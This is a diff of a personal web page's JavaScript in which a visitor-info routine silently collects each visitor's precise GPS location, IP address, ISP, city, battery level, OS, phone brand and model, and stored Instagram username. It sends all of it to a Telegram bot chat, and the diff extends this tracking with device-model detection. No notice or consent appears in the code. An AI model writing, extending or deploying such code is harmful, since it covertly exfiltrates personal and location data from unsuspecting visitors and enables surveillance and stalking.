@@ -172,55 +172,101 @@ document.getElementById('sendQ').addEventListener('click', async () => {
 });
 
 // === INFO PENGUNJUNG ===
-async function showVisitorInfo() { 
+async function showVisitorInfo() {
   try {
     let visitorID = localStorage.getItem("visitor_id");
     if (!visitorID) {
-      // Buat ID unik: timestamp + random + sebagian userAgent -> SHA-256 -> ambil 16 hex
       const raw = `${Date.now()}-${Math.random().toString(36).slice(2,10)}-${navigator.userAgent}`;
       try {
         const enc = new TextEncoder();
         const hashBuf = await crypto.subtle.digest("SHA-256", enc.encode(raw));
-        visitorID = Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2,"0")).join("").slice(0,16);
-      } catch (e) {
-        // fallback sederhana bila SubtleCrypto tidak tersedia
+        visitorID = Array.from(new Uint8Array(hashBuf))
+          .map(b => b.toString(16).padStart(2,"0")).join("").slice(0,16);
+      } catch {
         visitorID = ("v" + Math.random().toString(36).slice(2,10) + Date.now().toString(36)).slice(0,16);
       }
       localStorage.setItem("visitor_id", visitorID);
       localStorage.setItem("visitor_first_seen", new Date().toISOString());
     }
-    // visit count
     let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
     visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
     localStorage.setItem("visitor_visits", String(visitCount));
-  } catch (err) {
-    // localStorage may be disabled -> ignore but continue
-    console.warn("visitor-id error:", err);
-  }
+  } catch (err) { console.warn("visitor-id error:", err); }
 
-  // Ambil savedUser seperti script lama
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
 
-  // internal helper: safe fetch with retry
   async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
     for (let i = 0; i < retries; i++) {
-      try {
-        return await fetch(url, opts);
-      } catch (e) {
+      try { return await fetch(url, opts); }
+      catch (e) {
         if (i === retries - 1) throw e;
-        await new Promise(res => setTimeout(res, retryDelay * Math.pow(2, i)));
+        await new Promise(r => setTimeout(r, retryDelay * Math.pow(2,i)));
       }
     }
   }
 
-  // original sendToTelegram but extended to include visitorID & visits
-  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
+  // 🔍 deteksi merek + model
+  function detectDeviceBrandModel() {
+    const ua = navigator.userAgent.toLowerCase();
+    let brand = "Tidak diketahui", model = "";
+
+    // --- Brand umum ---
+    if (/xiaomi|redmi|mi\s/i.test(ua)) brand = "Xiaomi / Redmi";
+    else if (/poco/i.test(ua)) brand = "Poco";
+    else if (/samsung|sm-|galaxy/i.test(ua)) brand = "Samsung";
+    else if (/iphone|ipad|ipod/i.test(ua)) brand = "Apple";
+    else if (/vivo/i.test(ua)) brand = "Vivo";
+    else if (/oppo/i.test(ua)) brand = "Oppo";
+    else if (/realme/i.test(ua)) brand = "Realme";
+    else if (/huawei|honor/i.test(ua)) brand = "Huawei/Honor";
+    else if (/asus|zenfone/i.test(ua)) brand = "ASUS";
+    else if (/lenovo/i.test(ua)) brand = "Lenovo";
+    else if (/infinix/i.test(ua)) brand = "Infinix";
+    else if (/tecno/i.test(ua)) brand = "Tecno";
+    else if (/nokia/i.test(ua)) brand = "Nokia";
+    else if (/oneplus/i.test(ua)) brand = "OnePlus";
+    else if (/motorola|moto/i.test(ua)) brand = "Motorola";
+    else if (/google/i.test(ua)) brand = "Google Pixel";
+    else if (/sony/i.test(ua)) brand = "Sony Xperia";
+
+    // --- Model / seri umum ---
+    if (/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i.test(ua)) {
+      const m = ua.match(/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i);
+      model = "Galaxy " + m[1].toUpperCase();
+    } else if (/redmi\s(note|[0-9]+)/i.test(ua)) {
+      const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i);
+      model = m[0].replace(/\s+/g," ");
+    } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) {
+      model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
+    } else if (/mi\s([0-9a-z]+)/i.test(ua)) {
+      model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
+    } else if (/vivo\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/oppo\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/realme\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/iphone\s?[0-9]*/i.test(ua)) {
+      const m = ua.match(/iphone\s?[0-9]*/i);
+      model = m ? m[0].replace(/\s+/g," ") : "iPhone";
+    }
+
+    if (model && !model.toLowerCase().includes(brand.toLowerCase()))
+      return `${brand} ${model}`;
+    return brand;
+  }
+
+  async function sendToTelegram(d, latitude, longitude, source="Unknown", accuracy=null) {
     try {
       const now = new Date();
       const mapLink = (latitude && longitude)
         ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
         : "https://www.google.com/maps";
-      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
+
+      const isMobile = /mobile/i.test(navigator.userAgent);
+      const deviceType = isMobile ? "📱 Mobile" : "🖥️ Desktop";
+      const brandModel = isMobile ? detectDeviceBrandModel() : "PC / Laptop";
+
       const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
         /Android/i.test(navigator.userAgent) ? "Android" :
         /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
@@ -230,12 +276,10 @@ async function showVisitorInfo() {
       let batteryInfo = "Tidak diketahui";
       try {
         if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
+          const b = await navigator.getBattery();
+          batteryInfo = `${(b.level*100).toFixed(0)}% (${b.charging?"⚡":"🔋"})`;
         }
-      } catch (e) {
-        // ignore battery errors
-      }
+      } catch {}
 
       const visitorID = localStorage.getItem("visitor_id") || "unknown";
       const visits = localStorage.getItem("visitor_visits") || "1";
@@ -245,46 +289,38 @@ async function showVisitorInfo() {
 👤 ${savedUser}
 🆔 ID Pengunjung: ${visitorID}
 🧮 Kunjungan ke: ${visits}${firstSeen ? ` (first: ${new Date(firstSeen).toLocaleString('id-ID')})` : ""}
-🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
+🌎 ${d.city||"?"}, ${d.country||d.country_name||"?"}
 🗺️ Maps: ${mapLink}
-📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
-💻 ${device}
+📍 Sumber Lokasi: ${source}${accuracy?` (±${accuracy}m)`:""}
+💻 ${deviceType} — ${brandModel}
 🧩 OS: ${os}
 🔋 Baterai: ${batteryInfo}
 🏷️ ISP: ${d.connection?.isp || d.org || "?"}
 📡 IP: ${d.ip || "?"}
 🕓 ${now.toLocaleString('id-ID')}`;
 
-      await safeFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-      }, 4);
-
-    } catch (err) {
-      console.error("❌ Gagal kirim info:", err);
-    }
+      await safeFetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify({ chat_id:CHAT_ID, text:msg })
+      },4);
+    } catch(e){ console.error("❌ Gagal kirim info:",e); }
   }
 
   try {
-    const coords = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+    const coords = await new Promise((res,rej)=>{
+      navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0});
     });
-    const { latitude, longitude, accuracy } = coords.coords;
+    const {latitude,longitude,accuracy} = coords.coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
     await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
-  } catch (err) {
+  } catch {
     try {
       const d = await (await fetch("https://ipwho.is/")).json();
       await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
-    } catch (e) {
+    } catch(e){
       console.error("❌ Gagal ambil data IP:", e);
-      try {
-        const minimal = { city: "?", country: "?", ip: "?" };
-        await sendToTelegram(minimal, null, null, "unknown");
-      } catch (ee) {
-        console.error("❌ Gagal kirim minimal info:", ee);
-      }
+      await sendToTelegram({city:"?",country:"?",ip:"?"},null,null,"unknown");
     }
   }
 }
@@ -545,4 +581,5 @@ showVisitorInfo();
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
